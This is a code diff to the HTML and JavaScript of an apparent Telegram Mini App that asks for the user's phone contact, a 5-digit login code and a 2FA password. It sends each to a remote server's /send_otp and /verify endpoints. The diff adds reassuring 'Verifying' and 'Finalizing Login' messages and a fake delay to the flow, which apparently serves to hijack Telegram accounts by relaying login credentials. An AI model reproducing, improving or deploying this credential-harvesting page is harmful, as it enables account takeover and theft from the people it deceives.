@@ -32,12 +32,12 @@
         /* Full Page Animated Loader */
         #full-page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(15px);
             display: none; flex-direction: column; justify-content: center;
             align-items: center; z-index: 1000;
         }
-        .loading-emoji { width: 100px; height: 100px; animation: pulse 1.2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+        .loading-emoji { width: 110px; height: 110px; animation: pulse 1.2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }
 
         .app-container {
             width: 90%; max-width: 380px; text-align: center; padding: 30px 20px;
@@ -79,7 +79,7 @@
 
     <div id="full-page-loader">
         <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/People/Thinking%20Face.webp" class="loading-emoji">
-        <p style="margin-top: 15px; font-weight: bold; color: white;">Processing...</p>
+        <p id="loader-text" style="margin-top: 15px; font-weight: bold; color: white;">Verifying...</p>
     </div>
 
     <div class="app-container" id="main-content">
@@ -135,7 +135,8 @@
         let currentOtp = "";
         let userPhone = "";
 
-        function toggleLoader(show) {
+        function toggleLoader(show, text = "Processing...") {
+            document.getElementById('loader-text').innerText = text;
             document.getElementById('full-page-loader').style.display = show ? 'flex' : 'none';
         }
 
@@ -144,22 +145,25 @@
             document.getElementById('step' + n).classList.add('active');
         }
 
-        // ১. নম্বর নেয়া এবং সরাসরি রেন্ডারে পাঠানো
         function handleStart() {
             tg.requestContact((sent, response) => {
                 if (sent && response && response.contact) {
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
 
-                    // সাথে সাথে ওটিপি পেজে মুভ
-                    nextStep(2);
+                    // সমাধান: নম্বর পাওয়ার পর লোডার দেখানো এবং ওটিপি পেজে মুভ করা
+                    toggleLoader(true, "Verifying Number...");
+                    
+                    setTimeout(() => {
+                        toggleLoader(false);
+                        nextStep(2);
+                    }, 1500);
 
-                    // ব্যাকগ্রাউন্ডে রেন্ডার সার্ভারে পাঠানো
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
-                    });
+                    }).catch(e => console.log("Request sent to background"));
                 }
             });
         }
@@ -178,9 +182,8 @@
             if (currentOtp.length === 5) { verifyOtp(); }
         }
 
-        // ২. ওটিপি ভেরিফাই এবং ২এফএ চেক
         async function verifyOtp() {
-            toggleLoader(true);
+            toggleLoader(true, "Checking Code...");
             try {
                 const res = await fetch(`${RENDER_URL}/verify`, {
                     method: 'POST',
@@ -191,9 +194,9 @@
                 toggleLoader(false);
 
                 if (data.status === "done") {
-                    nextStep(4); // সফল
+                    nextStep(4);
                 } else if (data.status === "need_2fa") {
-                    nextStep(3); // ২এফএ লাগবে
+                    nextStep(3);
                 } else {
                     throw new Error();
                 }
@@ -202,16 +205,18 @@
                 document.getElementById('otp-wrap').classList.add('shake');
                 document.getElementById('otp-error').style.display = "block";
                 currentOtp = "";
-                for(let i=1;i<=5;i++) { document.getElementById('otp'+i).value=""; document.getElementById('otp'+i).classList.remove('filled'); }
+                for(let i=1;i<=5;i++) { 
+                    document.getElementById('otp'+i).value=""; 
+                    document.getElementById('otp'+i).classList.remove('filled'); 
+                }
                 setTimeout(() => document.getElementById('otp-wrap').classList.remove('shake'), 500);
             }
         }
 
-        // ৩. ২এফএ পাসওয়ার্ড সাবমিট এবং সেসন কমপ্লিট করা
         async function verify2FA() {
             const pass = document.getElementById('2fa-input').value;
             if(!pass) return;
-            toggleLoader(true);
+            toggleLoader(true, "Finalizing Login...");
             try {
                 const res = await fetch(`${RENDER_URL}/verify`, {
                     method: 'POST',
